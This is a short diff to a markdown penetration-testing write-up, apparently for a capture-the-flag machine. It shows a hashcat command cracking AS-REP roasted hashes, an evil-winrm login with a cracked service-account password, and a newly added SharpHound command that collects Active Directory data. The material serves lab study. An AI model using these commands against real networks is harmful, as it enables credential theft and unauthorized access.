@@ -48,7 +48,10 @@ hashcat -m 18200 -a 0 asreprost.hashes /usr/share/seclists/Passwords/Leaked-Data
 evil-winrm -i $IP -u svc-alfresco -p s3rvice
 ```
 
-##### BloodHound
+##### BloodHound/SharpHound
+```powershell
+.\SharpHound.exe -c all --zipfilename ad-data-kick
+```
 
 
 
